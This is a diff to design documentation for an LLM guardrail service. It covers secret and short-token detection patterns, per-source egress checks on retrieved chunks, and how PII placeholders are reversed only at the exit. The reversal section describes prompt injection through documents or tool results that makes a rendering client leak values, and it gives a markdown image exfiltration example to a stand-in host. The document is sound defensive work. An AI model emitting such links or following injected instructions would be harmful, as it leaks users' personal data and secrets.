@@ -17,7 +17,7 @@ with the full package (08).
 | `prompt.pre` | once per user turn |
 | `input.pre` | before every model call |
 | `output.pre` | before the answer reaches the caller |
-| `output.stream.delta` | during streaming (needs the C17 buffer; refused in 08-lite) |
+| `output.stream.delta` | during streaming (no rule type runs here yet; refused as a rule stage) |
 | `tool.pre` | tool name and arguments, before the call |
 | `tool.post` | tool result, before it goes back to the model |
 | `egress` | the final packet sent to the model provider (llmaas) |
@@ -57,13 +57,31 @@ Two entities, both per project:
 | Type | Finds | Action |
 |---|---|---|
 | `pii` | categories enabled in the referenced PII policy (`pii_policy_key`) | the rule's action; without one, each category's action, else the PII policy's default action |
-| `secrets` | vendor keys (`sk-`, AWS, GitHub, Slack), JSON web tokens, private key blocks, connection strings with a password, values after a password keyword, high-entropy tokens (≥ 24 characters, ≥ 3.5 bits per character; UUIDs excluded, and names made of plain words and numbers such as `SZL-2025-003_temizlik-hizmet`: every `-`/`_` segment is digits, a word (case-normalized: at least 30 % vowels, no run of 3 consonants), a short tag (`v2`, `q3`, `kdv`) or an upper-case code of 2-6 letters directly before a number (`PRSIM-1234`); one other segment, or more than 15 tag and code letters in three or more segments, keeps the value under the check), hex strings of 32+ characters with letters and digits | required |
+| `secrets` | vendor keys (`sk-`, AWS, GitHub, Slack), JSON web tokens, private key blocks, connection strings with a password, values after a password keyword, high-entropy tokens (≥ 24 characters, ≥ 3.5 bits per character; UUIDs excluded, and names made of plain words and numbers such as `SZL-2025-003_temizlik-hizmet`: every `-`/`_` segment is digits, a word (case-normalized: at least 30 % vowels, no run of 3 consonants), a short tag (`v2`, `q3`, `kdv`) or an upper-case code of 2-6 letters directly before a number (`PRSIM-1234`); one other segment, or more than 15 tag and code letters in three or more segments, keeps the value under the check), hex strings of 32+ characters with letters and digits; tokens of 13-23 characters only when a credential word names them (`API_KEY=`, `Authorization: Bearer`, `token:`, `client_secret=`, `the secret is`, `erişim anahtarı:`), with the same exemptions (see "Short tokens") | required |
 | `tool_args` | regex `patterns` in the arguments of `tools` (`<tool_key>.<action>`, wildcards allowed); `args` limits the search to named arguments of a JSON object | `block`, `warn` or `log`; only at `tool.pre` |
 
 `injection`, `topic`, `output_format` and `banned_words` are refused with
 `422 rule_type_unsupported` until they are delivered. A category without a recognizer (for example
 `PERSON`) can only be enabled together with a custom pattern; otherwise `422
 category_unsupported`. Nothing that looks enabled is silently ignored.
+
+### Short tokens (FOLLOWUP-106)
+
+Below 24 characters entropy does not separate a key from a code or a name, so a short token is a finding only when a credential word stands right before it (`api_key`, `access_key`, `client_secret`, `secret_key`, `secret`, `token`, `authorization`, `bearer`, and `anahtar` only as `erişim/erisim/API/gizli anahtar(ı/i)`, since "anahtar teslim" is an idiom; then an optional `:`/`=`/`is`, quotes and `Bearer`/`Basic`). Digits only, a single word, plain identifiers (as above), camelCase/PascalCase names of whole humps (`getAccessToken`, `BearerTokenRequired`) and ticket ids (2-6 capital letters then 6+ digits, `INC0012345678`) stay exempt. The patterns are linear in the input (one way to match whitespace; 200,000 spaces after a credential word finish well under a second). Measured with random values in nine credential phrasings (seed 106, 2,000 per shape; `tests/unit/test_08t_secrets_short.py`):
+
+| Shape (13-23 characters) | With a credential word | Same values without one |
+|---|---|---|
+| upper case 2x6 (`ABCDEF_GHIJKL`) | 95.2 % | 0 / 200 |
+| upper case 3x6 | 99.0 % | 0 / 200 |
+| upper case 16 | 99.1 % | 0 / 200 |
+| mixed case and digits 14 | 99.95 % | 0 / 200 |
+| upper case and digits 20 | 100 % | 0 / 200 |
+
+Upper case 2x6 stays near 95 %: about one random pair of six letters in twenty reads as two words and keeps the plain-identifier exemption, which document names and codes need. Without a credential word nothing changed (08 r3: 0 % for these shapes).
+
+### Egress per source (FOLLOWUP-107)
+
+In an agent run every retrieved chunk goes through `egress` on its own before it is put into the model's input (`always` retrieval and `search_documents` results alike). A block on one chunk leaves that chunk out and lists it under `blocked` in the `sources` event (public fields, `reason`, `reference_id`; never the text); the run fails `guardrail_block` only when every chunk is blocked. The question, history and tool results still pass `egress` as a whole message (BLOCKERS 134): a secret there fails the run as before.
 
 ### Chain, modes and errors
 
@@ -107,10 +125,37 @@ replaces the built-in one.
 |---|---|
 | `redact` | `[TR_NATIONAL_ID]` (the category code) |
 | `mask` | at most the last four characters and never more than half stay visible: `*******0146`, CVV `**8`, a one-digit value `*`; e-mail keeps the first letter (none if the local part has one letter) and the domain: `a***@ornek.com`, `*@example.org`. A masked value never equals the raw one |
-| `tokenize` | `<<PII_1>>`; exactly the same value gets the same placeholder within a run (no normalisation: `a.b@x` and `ab@x` are different; the same number written differently gets a separate placeholder, never a wrong one). The mapping lives in Redis for the run (`PII_TOKEN_TTL_S`, renewed on use) and is created in one atomic Redis script, so no caller sees a placeholder whose reverse entry is missing. It is reversed on output; a placeholder the run never issued is reported, not guessed |
+| `tokenize` | `<<PII_1>>`; exactly the same value gets the same placeholder within a run (no normalisation: `a.b@x` and `ab@x` are different; the same number written differently gets a separate placeholder, never a wrong one). The mapping lives in Redis for the run (`PII_TOKEN_TTL_S`, renewed on use) and is created in one atomic Redis script, so no caller sees a placeholder whose reverse entry is missing. Numbers come from a counter per scope that lives 400 days (longer than any stored copy), so a number is never issued twice in a scope, even after its mapping expired; a scope's counter first passes every placeholder number up to 1,000,000 the request or the conversation carries in. A scope issues at most 9,999,999. A placeholder has 1-7 ASCII digits: a longer `<<PII_n>>` or one with non-ASCII digits is no placeholder (never carried, reserved or reversed). A carried placeholder above 1,000,000 is ignored, not reserved (KARARLAR (h′)): a conversation that has one keeps working and later values get ordinary numbers; no real scope reaches that number, so nothing collides. A scope that would issue past 9,999,999 (a carried `<<PII_9999999>>` and a new value) fails loudly with `placeholder_out_of_range`, whatever the policy's `on_error` says; the internal evaluate endpoint answers it with 400. It is reversed on output; a placeholder the run never issued is reported, not guessed |
 
 Tokenize needs a run id (`run_id` in the internal request); without one the rule fails and
 follows `on_error`.
+
+### Reversal at the exit (C17)
+
+Placeholders are reversed only where text leaves the backend: the console run stream (live and replay) for the run's own user, the facade's agent path, direct model path (one piece and live stream) and external agent path for the caller. A live stream never splits a placeholder: on the agent path the writer holds a delta's tail that may still open one (`PlaceholderAligner`, at most 15 characters) so every stored stream entry has whole placeholders; on the direct path each choice's content and tool call arguments pass a `StreamDetokenizer`. Nothing is reversed when the policy enforces a `pii` rule on `output.pre`/`output.stream.delta` (the output was checked with the placeholders in it; the kept placeholders are logged as `detokenize_skipped_policy scope=<run or request> count=<n>`, no value), and nothing stored is reversed. Unresolved placeholders stay and are logged (`detokenize_unresolved scope=<run or request> count=<n>`).
+
+Who sees what (C17):
+
+| Who | Sees |
+|---|---|
+| The provider and an external agent (llmaas) | placeholders (egress tokenizes) |
+| The run's own user on the console (live stream, replay) | values |
+| The caller of a facade request (direct model, agent, external agent) | values |
+| Another member reading the run (analyst, admin, approver) | placeholders |
+| Stored views (`GET /runs/{id}`, `GET /runs/{id}/events`, approvals) | placeholders |
+| A placeholder after the first HTML tag in the reader's stream (also `<br>`, `List<String>`), or on a URL line (a URL scheme such as `http:`, or `](`, `]:`, `//`, `url(`, `src=`, `href=`, `srcset=`, `action=`, `poster=`, `background=`, `style=`, `data=`), for every reader | placeholder (`detokenize_skipped_url`, count only) |
+| Any reader when the policy enforces a `pii` rule on the output | placeholders (`detokenize_skipped_policy`, count only) |
+
+Placeholders stay where an upstream (external agent, provider, or an instruction injected through a document or tool result) could make a client that renders the answer send a value to its host, e.g. `![x](https://its-host/?q=<<PII_1>>)` or an HTML tag that loads a URL (KARARLAR "C17 geri çevirme bağlam istisnası", "C17 URL bağlam kuralı satır düzeyinde ve fail-closed" with its addendum, "C17 geri çevirme: cevap düzeyinde HTML fail-closed"). Two rules, neither of which tries to follow HTML:
+
+- **HTML, for the rest of the reader's stream.** After the first HTML tag (`<` and a letter; the only exception is `<PII_n>>` followed by `>>`, whatever comes before it, so `<PII_1 style` is a tag) no placeholder of the rest of that text or stream is reversed. On the console and the facade agent the rule is per reader of a run, not per model turn: it is not reset between turns, and a reader that continues after an approval replays the earlier entries first, so a tag in the first turn also keeps the values of the final answer. Earlier rounds followed tags, quotes and attribute values line by line and each round found a respelling (a stray quote, a `<pre>` or `<style>` block, CSS and entity escapes); a fail-closed rule does not rely on such distinctions.
+- **Markdown and URLs, per line.** No placeholder is reversed on a line with a URL scheme and its colon (`http:`, `https:`, `ftp:`, `data:`, `javascript:`, `blob:`, `file:`) or a marker (`](`, `]:`, `//`, `url(`, `src=`, `href=`, `srcset=`, `action=`, `poster=`, `background=`, `style=`, `data=`): `]( //host`, a reference definition `[1]: //host`, an angle target `](<./a b>)`. A markdown target left open at the end of its line (a destination, an angle target, `]:` with its value on the next line) keeps the next line under the rule until it closes or a blank line ends it (CommonMark does not let one cross a blank line).
+
+A stream scans each new piece with a short overlap and keeps at most 8,192 characters of its current line; a longer line keeps its placeholders, and when a marked or open line is cut that way the rest of the stream keeps them. A CR that ends a stream piece does not end the line (half a CRLF). A reader that starts after an entry (`Last-Event-ID`, `after`, the console after an approval) rebuilds this state from the stored live token entries up to it; when it cannot (the entry is gone, Redis fails, any other error) the rest of the stream keeps its placeholders. When the live stream has expired, a reader that starts after an entry gets the stored rows and keeps all their placeholders, since there is no live entry to rebuild from. On a stream, a placeholder already sent before the line's marker or the answer's first tag arrived is not taken back (it is not in a target: every target starts after its marker); a text in one piece keeps every placeholder of the line.
+
+The trade-off (accepted, fail-closed; KARARLAR "C17 HTML kuralı, düzeltmeler" (i)): a value reaches the reader as a placeholder on a line with a link or a marker, also where the marker is plain prose (`Personal data: <<PII_1>>`, `Attached file: …` read as the schemes `data:` and `file:`, a code comment with `//`), and anywhere after the first `<` and a letter, which model answers write often without meaning HTML: a `<br>` in a table cell, `List<String>`, `#include <stdio.h>`, `Bearer <token>`, `<your-email>`, `x<y`. The cost falls on every reader, the owner on the FFCore console too: the console shows answers as plain text, so there it hides values without guarding against a leak, but it has no exemption, because a console that renders markdown later would otherwise be open without notice. Only the leak risk is limited to clients that render raw HTML or markdown. Tool call arguments get the values JSON-escaped.
+
+If the token store cannot be read at the exit, the answer ends with a coded error and does not show placeholders silently. The console stream sends an `error` event `detokenize_unavailable` with the id of the last entry the reader got (the run goes on; reconnect with that Last-Event-ID to get the failed entry again). The facade (agent, direct model, external agent) answers 502 `api_error` `detokenize_unavailable`; once a stream has started it is `data: {"error": {..., "code": "detokenize_unavailable"}}` without an id, then `data: [DONE]` (on the direct live stream what the reveal held goes out first, unreversed). A facade agent run goes on and is followed again with `X-Resume-Run-Id`, which starts after the run's last approval or question event (or from the start).
 
 ## PII categories (canonical list)
 
